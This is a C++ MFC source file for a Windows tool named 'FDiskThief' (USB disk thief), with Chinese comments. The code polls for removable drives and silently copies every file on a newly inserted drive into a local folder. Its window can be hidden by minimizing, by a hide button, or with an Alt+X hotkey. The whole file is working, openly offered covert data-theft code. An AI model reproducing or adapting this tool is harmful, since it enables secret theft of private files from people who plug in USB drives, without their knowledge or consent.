// FDiskThiefDlg.cpp : implementation file
//

#include "stdafx.h"
#include "FDiskThief.h"
#include "FDiskThiefDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CFDiskThiefDlg dialog

CFDiskThiefDlg::CFDiskThiefDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFDiskThiefDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFDiskThiefDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_Path=_T("");
	m_NewFdisk=_T("");
	m_OldFdisk=_T("");
	IsRun=FALSE;
}

void CFDiskThiefDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFDiskThiefDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CFDiskThiefDlg, CDialog)
	//{{AFX_MSG_MAP(CFDiskThiefDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_OPEN, OnButtonOpen)
	ON_BN_CLICKED(IDC_BUTTON_HIDE, OnButtonHide)
	ON_MESSAGE(WM_HOTKEY,OnHotKey)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON_START, OnButtonStart)
	ON_BN_CLICKED(IDC_BUTTON_STOP, OnButtonStop)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFDiskThiefDlg message handlers

BOOL CFDiskThiefDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	//-------------------------------------
	char Path[255];
    GetCurrentDirectory(255, Path);
	m_Path.Format("%s",Path);
	GetDlgItem(IDC_EDIT_PATH)->SetWindowText(m_Path);
    //-------------------------------------
    ::RegisterHotKey(m_hWnd,199,MOD_ALT,'X');
    //-------------------------------------
    SetTimer(0,80,NULL);
    //-------------------------------------
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CFDiskThiefDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
		
	if(nID == SC_MINIMIZE)//如果最小化
        ShowWindow(SW_HIDE);    //隐藏窗口
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CFDiskThiefDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFDiskThiefDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}
//---------------------------
int select_any(char path[MAX_PATH], char *title = "请选择目录...") //if (select_any(buf))
{
	BROWSEINFO bi;
	ITEMIDLIST *pidl;

	bi.hwndOwner = NULL;
	bi.pidlRoot = NULL;
	bi.pszDisplayName = path;
	bi.lpszTitle = title;
	bi.ulFlags = BIF_EDITBOX;
	bi.lpfn = NULL;
	bi.lParam = 0;
	bi.iImage = 0;

	pidl = SHBrowseForFolder(&bi);
	return (pidl && SHGetPathFromIDList(pidl, path));
}

void CFDiskThiefDlg::OnButtonOpen() 
{
	// TODO: Add your control notification handler code here
	char buf[MAX_PATH] = {0};
	if (select_any(buf))
	{
		m_Path = buf;
		UpdateData(FALSE);
	}
	GetDlgItem(IDC_EDIT_PATH)->SetWindowText(m_Path);
}

void CFDiskThiefDlg::OnButtonHide() 
{
     ShowWindow(SW_HIDE);	
}

void CFDiskThiefDlg::OnHotKey(WPARAM wp,LPARAM lp)//热键
{
	if(wp==199)
	{
		if(IsWindowVisible())
			ShowWindow(SW_HIDE);
		else
	//		ShowWindow(SW_SHOWNORMAL);
	    ShowWindow(SW_SHOW);
	}
}

BOOL CFDiskThiefDlg::DestroyWindow() 
{
	// TODO: Add your specialized code here and/or call the base class
	::UnregisterHotKey(m_hWnd,199);//释放注册的热键

	return CDialog::DestroyWindow();
}
//-------查找U盘-------------------------------
CString CFDiskThiefDlg::FindFdisk()
{
	CString strdir="";
	for(char cc='A';cc<='Z';cc++)
	{
		strdir.Format("%c:",cc);
		if(GetDriveType((LPCTSTR)strdir)==DRIVE_REMOVABLE)//移动盘
	      return strdir;
    }
    return strdir="";
}
//--------复制文件-----------------------------
void CFDiskThiefDlg::CopyFile(CString dir)
{   
	CFileFind tempFind;
    CString tempFileFind;
    tempFileFind.Format("%s\\*.*",dir);
    BOOL IsFinded=(BOOL)tempFind.FindFile(tempFileFind);
    while(IsFinded)
    {
      IsFinded=(BOOL)tempFind.FindNextFile();
      if(!tempFind.IsDots())
      {
         CString foundFileName;
         foundFileName=tempFind.GetFileName();
		 
         if(tempFind.IsDirectory())
         {
            CString tempDir;
            tempDir.Format("%s\\%s",dir,foundFileName);
            CopyFile(tempDir);
         }
         else
         {
            CString tempFileName1,tempFileName2;
            tempFileName1.Format("%s\\%s",dir,foundFileName);
			tempFileName2.Format("%s\\%s",m_Path,foundFileName);
            ::CopyFile(tempFileName1,tempFileName2,FALSE);
         }
      }
    }
    tempFind.Close();
}

void CFDiskThiefDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if(IsRun)
	{
		m_NewFdisk=FindFdisk();
 
		if(m_NewFdisk!=m_OldFdisk&&m_NewFdisk!="")
		{
			CopyFile(m_NewFdisk);
		}
        if(m_NewFdisk!="")
            m_OldFdisk=m_NewFdisk;
		else
            m_OldFdisk="NULL";
	}

	CDialog::OnTimer(nIDEvent);
}

void CFDiskThiefDlg::OnButtonStart() 
{
	// TODO: Add your control notification handler code here
	IsRun=TRUE;
	GetDlgItem(IDC_BUTTON_START)->EnableWindow(false);
	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(true);
}

void CFDiskThiefDlg::OnButtonStop() 
{
	// TODO: Add your control notification handler code here
	IsRun=FALSE;
	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(false);
	GetDlgItem(IDC_BUTTON_START)->EnableWindow(true);
}
